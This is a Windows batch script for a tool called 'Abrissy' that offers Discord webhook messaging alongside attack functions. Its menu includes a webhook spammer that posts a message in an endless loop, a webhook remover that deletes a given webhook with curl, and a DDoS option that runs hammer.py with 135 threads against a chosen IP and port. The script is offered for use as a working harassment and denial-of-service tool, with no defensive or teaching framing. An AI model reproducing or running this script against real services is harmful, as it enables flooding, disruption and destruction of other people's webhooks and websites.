@echo off
title Abrissy : Made by TorchStudios
chcp 65001 >nul
setlocal enabledelayedexpansion

set "arg=%1"

:switch
if "%arg%"=="" goto :hud
if "%arg%"=="-h" goto :help
if "%arg%"=="-wm" goto :webhookmessenger
if "%arg%"=="-wr" goto :webhookremover
if "%arg%"=="-ws" goto :webhookspammer
if "%arg%"=="-l7" goto :ddoswebsite 
if "%arg%"=="-pw" goto :pingwebsite 
if "%arg%"=="-credits" goto :credits  

echo 
goto :end
:end
endlocal

:hud 
type log.txt 
echo.
echo [37m[[0m[95mABRISSY[0m[37m][0m use -h to get help in Abrissy
goto end 
:help
echo [35m[[0m[37m-wm[0m[35m][0m [95mSend Discord webhook message.[0m
echo [35m[[0m[37m-wr[0m[35m][0m [95mRemove Discord webhook.[0m
echo [35m[[0m[37m-ws[0m[35m][0m [95mSpam webhook[0m
echo [35m[[0m[37m-l7[0m[35m][0m [95mSend DDoS Attack to website[0m
echo _________________________________________________________________________________________
echo.
echo [35m[[0m[37m-credits[0m[35m][0m [95mThis command shown informations about tool[0m

goto :end
:webhookspammer 
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
set /p "webhook=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter message to spam. 
set /p "message=>[95m"[0m
:spam 
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m Message sent.
timeout 1 >nul
goto spam 
:webhookremover
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
set /p "webhook=>[95m"[0m
curl -X DELETE %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m Webhook has been removed succesful 
goto end 

:webhookmessenger
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter webhook. 
set /p "webhook=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter message to send. 
set /p "message=>[95m"[0m
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo [37m[[0m[95mABRISSY[0m[37m][0m Message has been sent succesful
goto end 

:ddoswebsite 
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter website IP Adress (you can get website ip adress by using -pw )
echo [37m[[0m[95mABRISSY[0m[37m][0m Ctrl + C to stop
set /p "siteip=>[95m"[0m
echo [37m[[0m[95mABRISSY[0m[37m][0m Port: 
set /p "siteport=>[95m"[0m
python hammer.py -s %siteip% -t 135 -p %siteport%

:pingwebsite 
echo [37m[[0m[95mABRISSY[0m[37m][0m Enter website domain.
set /p "website=>[95m"[0m
for /f "tokens=2 delims=[]" %%a in ('ping -n 1 %website% ^| findstr /i "Pinging"') do (
    set "ip_address=%%a"
)
if defined ip_address (
    echo [37m[[0m[95mABRISSY[0m[37m][0m %website% = %ip_address%
) else (
    echo [37m[[0m[95mABRISSY[0m[37m][0m Cannot get IP from %website%
)
goto end
pause

:credits 
echo [37m[[0m[95mABRISSY[0m[37m][0m This tool was made by dc: abrissy / https://discord.gg/eWjJdFVf

:end
endlocal

